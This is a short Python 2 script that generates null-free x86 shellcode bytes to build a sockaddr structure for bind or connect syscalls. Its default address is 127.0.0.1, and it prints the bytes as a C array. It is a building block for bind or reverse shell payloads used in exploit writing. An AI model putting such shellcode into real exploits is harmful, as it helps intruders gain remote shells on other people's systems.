from struct import pack
import sys 
import binascii

##########################################################
#
#  build struct sockaddr for syscall : bind / connect
#
#	                         random	     2014-04-22
##########################################################


##########################################################
des_format = 'shellcode: build sockaddr for {%s:%s}' 
ALIGN = 4
IP = '127.0.0.1'
PORT = 0x1122
##########################################################

def out_format(language):
	if language=='c':
		des = '\n\n/*\n*  '+ des_format +'\n*/'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (str(IP),str(PORT))
 
def build_sockaddr_shellcode(ip, port):
	'''	
	 struct sockaddr {
				   sa_family_t sa_family;
				   char        sa_data[14];	 
			   }
	'''
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x50'															#push eax
	shellcode += '\x50'															#push eax
	if ip == '0.0.0.0':
		shellcode += '\x50'															#push eax
	else:
		#push IP
		zero_arr = [0,0,0,0]
		ip_value = 0
		ip = ip.split('.')[::-1]
		print ip
		for i in xrange(len(ip)):
			p = int(ip[i])
			if p == 0:
				p = p + 1
				zero_arr[i] = 1
			ip_value += p <<8*(i)
		print ip_value
		#push ip
		shellcode += "\x68"															#push
		shellcode += pack('>I',(ip_value))										#ip field
		for i in xrange(len(zero_arr)):
			if zero_arr[i] == 1:
				shellcode += '\xfe\x4c\x24'	+ pack('B',(i))					#dec byte [esp+i]
	#push port
	shellcode += '\x66\x68'													#pushw
	shellcode += pack('>H',(port))											#ip field	#host order is big endian
	shellcode += '\xb0\x02'													#sa_family = AF_INET = 2
	shellcode += '\x66\x50'													#pushw  %ax
	#shellcode += '\x89\xe0'													#mov %esp,%eax
	return shellcode

def getshellcode(language, shellcode):
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)
	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass	

if __name__ == '__main__':

	#language = 'bin'
	language = 'c'
	shellcode = build_sockaddr_shellcode(ip=IP, port=PORT)
	out_format(language)
	getshellcode(language, shellcode)
	



